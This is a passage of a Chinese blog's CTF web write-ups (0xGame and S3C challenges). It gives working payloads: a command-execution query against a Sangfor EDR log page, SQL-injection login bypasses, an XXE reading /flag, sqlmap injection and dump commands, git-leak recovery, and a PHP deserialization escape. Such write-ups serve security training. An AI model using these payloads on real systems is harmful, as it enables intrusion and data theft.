href="http://web.game.0xctf.com:30054/">http://web.game.0xctf.com:30054/</a></h4><p>进去看到<code>请输入linux指令</code></p><h3 id="最终-4"><a href="#最终-4" class="headerlink" title="最终"></a>最终</h3><p>直接cat /flag</p><p>问题解决：0xGame{fl4g_1s_c0ntent}</p><h2 id="edr"><a href="#edr" class="headerlink" title="edr"></a>edr</h2><h3 id="考察edr和搜索引擎"><a href="#考察edr和搜索引擎" class="headerlink" title="考察edr和搜索引擎"></a>考察edr和搜索引擎</h3><h4 id="题目地址：http-web1-game-0xctf-com-40000"><a href="#题目地址：http-web1-game-0xctf-com-40000" class="headerlink" title="题目地址：http://web1.game.0xctf.com:40000/"></a>题目地址：<a href="http://web1.game.0xctf.com:40000/">http://web1.game.0xctf.com:40000/</a></h4><p>深信服edr的漏洞</p><p>这里有一篇介绍：<a class="url" href="https://www.weixiuzhan.cn/news/show-21463.html" target="_blank" rel="noopener noreferrer">https://www.weixiuzhan.cn/news/show-21463.html</a></p><p>源码在这</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/** * c.php * 查看ldb的日志 * 支持正则表达式过滤，可以过滤文件以及每行日志   */</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/**   * 编解码      @param string $data 编解码数据        * @return string 返回编解码数据          /              $code = function($data) &#123;          for ($i = 0; $i &lt; strlen($data); ++$i) &#123;              $data[$i] = $data[$i] ^ 'G';          &#125;          return $data;              &#125;;/** * 加密请求 * @param string $site  站点 * @param string $query 请求串 * @return string 返回请求URL */</span><span class="token variable">$request</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$site</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span> <span class="token keyword">use</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$path</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token double-quoted-string string">"<span class="token interpolation"><span class="token variable">$site</span></span>/<span class="token interpolation"><span class="token variable">$path</span></span>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">/** * 解密回复 * @param string $data 回复数据 * @return array 返回回复数据 */</span><span class="token variable">$response</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token keyword">use</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token boolean constant">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$dec</span> <span class="token operator">=</span> <span class="token variable">$code</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$dec</span><span class="token punctuation">,</span> <span class="token boolean constant">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token variable">$ret</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">/** * 找到匹配的日志 * @param string $path 文件路径匹配 * @param string $item 日志项匹配 * @param string $topn TOP N  * @param string $host 主机 * @return array 返回匹配结果 */</span><span class="token variable">$collect</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span> <span class="token variable">$item</span><span class="token punctuation">,</span> <span class="token variable">$topn</span><span class="token punctuation">,</span> <span class="token variable">$host</span><span class="token punctuation">)</span> <span class="token keyword">use</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$request</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token variable">$response</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$path</span>   <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$item</span>   <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$item</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"http://127.0.0.1:8089"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"op=ll&amp;host=<span class="token interpolation"><span class="token variable">$host</span></span>&amp;path=<span class="token interpolation"><span class="token variable">$path</span></span>&amp;item=<span class="token interpolation"><span class="token variable">$item</span></span>&amp;top=<span class="token interpolation"><span class="token variable">$topn</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$response</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">/** * 显示某个表单域 * @param array $info 表单域信息, array("name" => "xx", "value" => "xxx", "note" => "help"); * @return */</span><span class="token variable">$show_input</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;p>&lt;font size=2><span class="token interpolation"><span class="token variable">$title</span></span>: &lt;/font>&lt;input type=\"text\" size=30 id=\"<span class="token interpolation"><span class="token variable">$name</span></span>\" name=\"<span class="token interpolation"><span class="token variable">$name</span></span>\" value=\"<span class="token interpolation"><span class="token variable">$value</span></span>\">&lt;font size=2><span class="token interpolation"><span class="token variable">$note</span></span>&lt;/font>&lt;/p>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">/** * 去掉反斜杠 * @param string $var 值 * @return string 返回去掉反斜杠的值 */</span><span class="token variable">$strip_slashes</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">get_magic_quotes_gpc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$var</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">/** * 显示表单 * @param array $params 请求参数 * @return */</span><span class="token variable">$show_form</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$params</span><span class="token punctuation">)</span> <span class="token keyword">use</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$strip_slashes</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token variable">$show_input</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$params</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$host</span>  <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span>  <span class="token operator">?</span> <span class="token variable">$strip_slashes</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span>  <span class="token punctuation">:</span> <span class="token double-quoted-string string">"127.0.0.1"</span><span class="token punctuation">;</span>    <span class="token variable">$path</span>  <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span>  <span class="token operator">?</span> <span class="token variable">$strip_slashes</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span>  <span class="token punctuation">:</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>    <span class="token variable">$row</span>   <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span>   <span class="token operator">?</span> <span class="token variable">$strip_slashes</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span>   <span class="token punctuation">:</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>    <span class="token variable">$limit</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$limit</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$strip_slashes</span><span class="token punctuation">(</span><span class="token variable">$limit</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token number">1000</span><span class="token punctuation">;</span>        <span class="token comment">// 绘制表单</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;pre>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;form id="studio" name="studio" method="post" action="">'</span><span class="token punctuation">;</span>    <span class="token variable">$show_input</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"title"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">"Host "</span><span class="token punctuation">,</span>  <span class="token double-quoted-string string">"name"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">"host"</span><span class="token punctuation">,</span>  <span class="token double-quoted-string string">"value"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$host</span><span class="token punctuation">,</span>  <span class="token double-quoted-string string">"note"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">" - host, e.g. 127.0.0.1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$show_input</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"title"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">"Path "</span><span class="token punctuation">,</span>  <span class="token double-quoted-string string">"name"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">"path"</span><span class="token punctuation">,</span>  <span class="token double-quoted-string string">"value"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$path</span><span class="token punctuation">,</span>  <span class="token double-quoted-string string">"note"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">" - path regex, e.g. mapreduce"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$show_input</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"title"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">"Row  "</span><span class="token punctuation">,</span>  <span class="token double-quoted-string string">"name"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">"row"</span><span class="token punctuation">,</span>   <span class="token double-quoted-string string">"value"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$row</span><span class="token punctuation">,</span>   <span class="token double-quoted-string string">"note"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">" - row regex, e.g. \s[w|e]\s"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$show_input</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"title"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">"Limit"</span><span class="token punctuation">,</span>  <span class="token double-quoted-string string">"name"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">"limit"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"value"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$limit</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"note"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">" - top n, e.g. 100"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;input type="submit" id="button">'</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;/form>'</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;/pre>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">/** * 入口函数 * @param array $argv 配置参数 * @return */</span><span class="token variable">$main</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">)</span>     <span class="token keyword">use</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$collect</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$limit</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$collect</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span> <span class="token variable">$row</span><span class="token punctuation">,</span> <span class="token variable">$limit</span><span class="token punctuation">,</span> <span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"\n"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"success"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"success"</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token boolean constant">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"\n"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"data"</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$host</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$items</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$last</span> <span class="token operator">=</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$items</span> <span class="token keyword">as</span> <span class="token variable">$item</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$item</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"name"</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token variable">$last</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$last</span> <span class="token operator">=</span> <span class="token variable">$item</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token double-quoted-string string">"\n[<span class="token interpolation"><span class="token variable">$host</span></span>] -> <span class="token interpolation"><span class="token variable">$last</span></span>\n\n"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">echo</span> <span class="token variable">$item</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"item"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"\n"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;html>&lt;head>&lt;meta http-equiv="Content-Type" Content="text/html; Charset=utf-8">&lt;/head>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;body bgcolor="#e8ddcb">'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;p>&lt;b>Log Helper&lt;/b>&lt;/p>"</span><span class="token punctuation">;</span><span class="token variable">$show_form</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;pre>"</span><span class="token punctuation">;</span><span class="token variable">$main</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;/pre>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>可以任意文件读取下载</p><h3>最终</h3>payload：./?strip_slashes=system&host=cat /flag<p>问题解决：0xGame{S4n9f0r_3dR_c4N_Rce_reC3n7_D4y}</p><h2 id="just-login"><a href="#just-login" class="headerlink" title="just_login"></a>just_login</h2><h3 id="burp爆破"><a href="#burp爆破" class="headerlink" title="burp爆破"></a>burp爆破</h3><h4 id="题目地址：http-web-game-0xctf-com-30055"><a href="#题目地址：http-web-game-0xctf-com-30055" class="headerlink" title="题目地址：http://web.game.0xctf.com:30055/"></a>题目地址：<a href="http://web.game.0xctf.com:30055/">http://web.game.0xctf.com:30055/</a></h4><p>dirsearch扫不到东西</p><p>sqlmap跑一下没用</p><p>不知道干啥，直接burp抓包用户名爆破<br>真爆出来了</p><h3>最终</h3>payload：<pre class="language-none"><code class="language-none">&#39; or 0&#x3D;0 #&#39; or 1&#x3D;1 or &#39;&#39;&#x3D;&#39;x&#39; or 1&#x3D;1 or &#39;x&#39;&#x3D;&#39;y</code></pre><p>问题解决：0xGame{e5sy_sql_1njeCtion}</p><h2 id="close-eyes"><a href="#close-eyes" class="headerlink" title="close_eyes"></a>close_eyes</h2><h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h3><h4 id="题目地址：http-web-game-0xctf-com-30052"><a href="#题目地址：http-web-game-0xctf-com-30052" class="headerlink" title="题目地址：http://web.game.0xctf.com:30052/"></a>题目地址：<a href="http://web.game.0xctf.com:30052/">http://web.game.0xctf.com:30052/</a></h4><h2 id="inject-me"><a href="#inject-me" class="headerlink" title="inject_me"></a>inject_me</h2><h3 id="XXE显式攻击"><a href="#XXE显式攻击" class="headerlink" title="XXE显式攻击"></a>XXE显式攻击</h3><h4 id="题目地址：http-web-game-0xctf-com-30061"><a href="#题目地址：http-web-game-0xctf-com-30061" class="headerlink" title="题目地址：http://web.game.0xctf.com:30061/"></a>题目地址：<a href="http://web.game.0xctf.com:30061/">http://web.game.0xctf.com:30061/</a></h4><h3 id="最终-5"><a href="#最终-5" class="headerlink" title="最终"></a>最终</h3><p>payload：</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">GVI</span> <span class="token punctuation">[</span><span class="token internal-subset"> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">foo</span> <span class="token attr-name">ANY</span> <span class="token punctuation">></span></span>&lt;!ENTITY xxe SYSTEM "file:///flag" ></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>admin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span></code></pre><p>问题解决：0xGame{V2ry_simple_XXE}</p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XFF </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>S3C WEB Write-up</title>
      <link href="article/S3C%20WEB%20Write-up/"/>
      <url>article/S3C%20WEB%20Write-up/</url>
      
        <content type="html"><![CDATA[<p>by:gyy</p><h2>WEB-常见的搜集</h2><h3>信息收集</h3>题目链接：<a class="url" href="http://10.147.19.176:7001/" target="_blank" rel="noopener noreferrer">http://10.147.19.176:7001/</a><hr />敏感文件Hello, CTFer!信息搜集之所以重要，是因为其往往会带给我们一些意想不到的东西<p>hack fun</p><hr /><h4>yysy,确实</h4>信息收集<h5>Part1</h5>遇事不决，先扫为敬真·找到了<pre><code>/.index.php.swp</code></pre>知识链接：.swp文件是备份文件，平时vim强退一定要注意.swp文件的删除！<p>进去访问下载<br><? php echo 'flag3:cDBydGFudF9oYWNr}';?></p><p>发现flag3，说明flag分为好多部分</p><h5>Part2</h5>扫描还扫到了<pre><code>/index.php~</code></pre>直接访问得flag2:c192M3J5X2lt<h5>Part3</h5>将扫描进行到底还扫到了<pre><code>/robots.txt</code></pre>进去康康<pre><code>User-agent: *Disallow:/flag1_is_her3_fun.txt</code></pre>访问得flag1:aW5mb18x<h3>最终</h3>组合得flag<h5>小结</h5>扫就完事了<h2>WEB-粗心的小李</h2><h3>Git泄露</h3>题目链接：<a class="url" href="http://10.147.19.176:7002/" target="_blank" rel="noopener noreferrer">http://10.147.19.176:7002/</a><hr />Git测试Hello, CTFer!当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当，可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。<p>小李好像不是很小心，经过了几次迭代更新就直接就把整个文件夹放到线上环境了:(</p><p>very easy</p><hr /><h4>Git</h4>访问<code>./.git</code>发现跳转到了<code>./.git/</code>根据题目是git泄露<h5>神器Git Hack</h5>命令：<pre><code>$ python2 GitHack.py -u "http://10.147.19.176:7002/.git"</code></pre>扒下来.git文件<h5>分析</h5>命令看一下<pre><code>$ git log --reflogcommit 213b7e386e9b0b406d91fae58bf8be11a58c3f88 (HEAD -> master)Author: Veneno <593220746@qq.com>Date:   Wed Dec 4 11:04:14 2019 +0800<p>flag<br></code></pre><br>发现有flag<br>恢复一下（注意，这里要往上一个目录）</p><pre><code>$ git reset --hard 213b7e386e9b0b406d91fae58bf8be11a58c3f88HEAD is now at 213b7e3 flag</code></pre><p>恢复了<code>index.html</code></p><h3>最终</h3>在<code>index.html</code>里找到flag<p>问题解决：n1book{Z2l0X2xvb2tzX3MwX2Vhc3lmdW4}</p><h5>小结</h5>Git hack好用，还有个git extrack<hr /><h2>WEB-SQL注入-1</h2><h3>SQL注入</h3>题目链接：<a class="url" href="http://10.147.19.176:7004/login.php" target="_blank" rel="noopener noreferrer">http://10.147.19.176:7004/login.php</a><hr /><h4>SQLmap真香</h4><h5>sql注入不说了</h5>sqlmap直接跑由于是POST测试，抓个包下来存文件，在name处改个<code>*</code>跑sqlmap<pre><code>$ python2 sqlmap.py -r 1.txt</code></pre>出结果<pre><code>sqlmap identified the following injection point(s) with a total of 1488 HTTP(s) requests:</code></pre><hr /><pre><code>Parameter: #1* ((custom) POST)Type: error-basedTitle: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</code></pre><h5>Payload: name=' AND (SELECT 7087 FROM(SELECT COUNT(<em>),CONCAT(0x71786b7171,(SELECT (ELT(7087=7087,1))),0x717a627671,FLOOR(RAND(0)</em>2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Uilw&pass=1</h5><hr /><pre><code> [INFO] the back-end DBMS is MySQLweb server operating system: Linux Ubuntuweb application technology: Apache 2.4.7, PHP 5.5.9back-end DBMS: MySQL >= 5.0</code></pre>ok，直接全扒下来<code>--dump</code><pre><code>Database: noteTable: users[2 entries]+----+----------------------------------+----------+| id | passwd                           | username |+----+----------------------------------+----------+| 1  | 26f1c86def93bd19fb3ba6ad3d9f2a87 | test     || 2  | 26f1c86def93bd19fb3ba6ad3d9f2a87 | admin    |+----+----------------------------------+----------+</code></pre><h3>最终</h3><h5>Payload =<code>sqlmap.py -r 1.txt -D note -T fl4g --dump</code></h5>问题解决：n1book{bG9naW5fc3FsaV9pc19uaWNl}<h5>小结</h5>善用Sqlmap，能跑出来的不多了...<hr /><h2>Unserialize++</h2><h3>反序列化字符串逃逸</h3>guest.php先上payload打到admin，字符串逃逸成功<h4>payload = your[name.able=uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu&your[pass.able=AA";s:12:"uuuuuuyour_pass";s:2:"AA";s:5:"admin";i:1;}</h4><h3>index.php中</h3><pre><code>file_put_contents("caches/".hash("sha256", \$\_SERVER['REMOTE_ADDR']), put(serialize($guest)));</code></pre>而<pre><code>function put($data)&#123;$data = str_replace(chr(0)."*".chr(0), 'uuuuuu', $data);return $data;&#125;</code></pre>每6个u换三个字符，使得name盖过pass的字符并"闭合，然后反序列化就会读取我们准备的字符，即从<pre><code>'your[pass.able=AA";s:12:"uuuuuuyour_pass";s:2:"AA";s:5:"admin";i:1;&#125;'</code></pre>的分号开始<p>本地./caches/下的内容</p><pre><code>O:7:"someone":3:&#123;s:12:"uuuuuuyour_name";s:60:"uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu";s:12:"uuuuuuyour_pass";s:53:"AA";s:12:"uuuuuuyour_pass";s:2:"AA";s:5:"admin";i:1;&#125;";s:8:"uuuuuuadmin";i:0;&#125;</code></pre><p>即后get</p><pre><code>function get($data)&#123;$data = str_replace('uuuuuu', chr(0)."*".chr(0), $data);return $data;&#125;</code></pre><p>会读取</p><pre><code>"O:7:\"someone\":3:&#123;s:12:\"\\u0000*\\u0000your_name\";s:60:\"\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\";s:12:\"\\u0000*\\u0000your_pass\";s:53:\"AA\";s:12:\"\\u0000*\\u0000your_pass\";s:2:\"AA\";s:5:\"admin\";i:1;&#125;\";s:8:\"\\u0000*\\u0000admin\";i:0;&#125;"</code></pre><p>忽略不可见字符后<br>读取到其中</p><pre><code> [your_name:protected] => **********";s:12:"*your_pass";s:53:"AA [your_pass:protected] => AA  [admin:protected] => 1</code></pre><p>然而本题和admin<strong>没有</strong>任何关系</p><h3>构造</h3><pre><code>O:6:"level1":1:&#123;s:8:"username";O:6:"level2":1:&#123;s:8:"username";O:6:"level3":1:&#123;s:8:"username";s:5:"admin";&#125;&#125;&#125;</code></pre>payload 